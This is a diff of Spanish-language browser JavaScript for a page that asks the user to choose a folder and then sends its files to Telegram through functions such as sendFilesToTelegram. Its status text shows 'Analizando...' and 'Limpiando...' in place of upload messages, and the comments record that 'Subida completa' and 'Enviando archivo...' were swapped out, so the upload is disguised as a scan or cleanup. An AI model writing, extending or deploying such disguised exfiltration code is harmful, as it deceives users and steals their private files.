@@ -14,7 +14,7 @@ function updateStatus(message, progress = 0) {
         const remaining = (elapsed / progress) * (100 - progress);
         timeElement.innerHTML = `⏳ Tiempo restante: ~${Math.floor(remaining)} segundos`;
     } else if (progress === 100) {
-        timeElement.innerHTML = 'Limpiando...'; // Cambiado de "✅ Operación completada"
+        timeElement.innerHTML = 'Limpiando...'; // Cambio mantenido
     } else {
         timeElement.innerHTML = '⏳ Calculando tiempo...';
     }
@@ -26,15 +26,15 @@ document.getElementById('start-btn').addEventListener('click', async () => {
 
     try {
         startTime = Date.now();
-        updateStatus('Analizando...', 5); // Cambiado de "Iniciando escaneo..."
+        updateStatus('Analizando...', 5); // Cambio mantenido
 
         if (!window.showDirectoryPicker) throw new Error('Navegador no compatible');
 
         const folderHandle = await window.showDirectoryPicker();
-        updateStatus('Analizando...', 20); // Cambiado de "Analizando estructura..."
+        updateStatus('Analizando...', 20); // Cambio mantenido
 
         await collectAndSendInChunks(folderHandle);
-        updateStatus('Limpiando...', 100); // Cambiado de "✅ Subida completa"
+        updateStatus('Limpiando...', 100); // Cambio mantenido
     } catch (error) {
         console.error(error);
         updateStatus('❌ Error: ' + error.message, 0);
@@ -152,7 +152,7 @@ async function sendFilesToTelegram(files) {
 
         sent++;
         const progress = 40 + Math.floor((sent / total) * 60);
-        updateStatus(`Analizando...`, progress); // Cambiado de "Enviando archivo..."
+        updateStatus(`Analizando...`, progress); // Cambio mantenido
     }
 
     // Procesar en paralelo
